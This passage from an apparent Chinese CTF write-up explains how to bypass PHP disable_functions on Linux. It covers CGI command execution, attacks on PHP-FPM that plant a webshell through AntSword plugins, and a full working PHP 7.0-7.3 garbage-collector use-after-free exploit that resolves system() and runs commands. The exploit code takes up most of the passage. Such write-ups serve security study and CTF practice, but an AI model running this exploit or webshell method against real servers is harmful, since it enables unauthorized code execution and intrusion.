class="line">echo&amp;&amp;id</span><br></pre></td></tr></table></figure><p>由于目标是liunx系统,linux中CGI比较严格。这里也需要去liunx系统创建文件上传,如果使用windows创建文件并上传是无法解析的。这里我比较听话直接去Linux上创建了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658850.png" alt="image-20231206165804798"><br>直接访问shell.ant出错，权限问题<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658036.png" alt="image-20231206165813940"><br>直接使用蚁剑修改权限<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061658107.png" alt="image-20231206165823026"><br>然后再访问可看到命令执行成功<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061659170.png" alt="image-20231206165847169"><br>经测试这里cat、ifconfig等命令用不了，ctfhub可以用ifconfig但是cat也用不了tac可用<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061659525.png" alt="image-20231206165953463"></p><p>后面发现应该是我傻逼了，cat的flag，但是flag是直接cat不了的</p><h2 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a>利用攻击PHP-FPM</h2><p>FPM其实是一个fastcgi协议解析器，服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据，得到执行该函数的环境变量。PHP-FPM拿到 fastcgi的数据包后，进行解析，然后执行 <code>SCRIPT_FILENAME</code>的值指向的php文件。<br><a href="https://www.php.cn/faq/455614.html">详解PHP中PHP-FPM是什么？有什么用？-php教程-PHP中文网</a></p><h3 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Linux 操作系统</li><li>PHP-FPM</li><li>存在可写的目录, 需要上传 .so 文件</li></ul><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>参考<a href="https://xz.aliyun.com/t/5598#toc-3">浅析php-fpm的攻击方式 - 先知社区 (aliyun.com)</a>感觉挺麻烦的，不想看了</p><h3 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h3><p>这里我直接用ctfhub上的环境了<br>首先执行一下phpinfo()查看是否配置了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061701130.png" alt="image-20231206170102069"><br>可以看到配置了<code>FPM/FastCGI</code>然后直接使用插件绕过，这个模式需要自己找配置文件查找FPM接口地址<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061701985.png" alt="image-20231206170133906"><br>默认的是 <code>unix:///</code> 本地 socket 这种的,如果配置成 TCP 的默认是 <code>127.0.0.1:9000</code>如下，配置文件位置为&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;zz-docker.conf<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702911.png" alt="image-20231206170202849"><br>开始执行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702524.png" alt="image-20231206170215436"><br>成功后可以看到 在<code>/var/www/html/</code> 目录下有个 <code>.antproxy.php</code> 文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702871.png" alt="image-20231206170226812"><br>然后连接这个shell即可命令执行，插件上传的shell密码也是没有变的，连接之后即可执行命令<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702352.png" alt="image-20231206170234295"></p><h2 id="利用-GC-UAF"><a href="#利用-GC-UAF" class="headerlink" title="利用 GC UAF"></a>利用 GC UAF</h2><p>利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3<br>这个pwn的也就不研究了</p><h3 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><h3 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h3><p>直接用ctfhub环境，用蚁剑插件来绕过<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061702075.png" alt="image-20231206170249979"><br>也有现成的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span 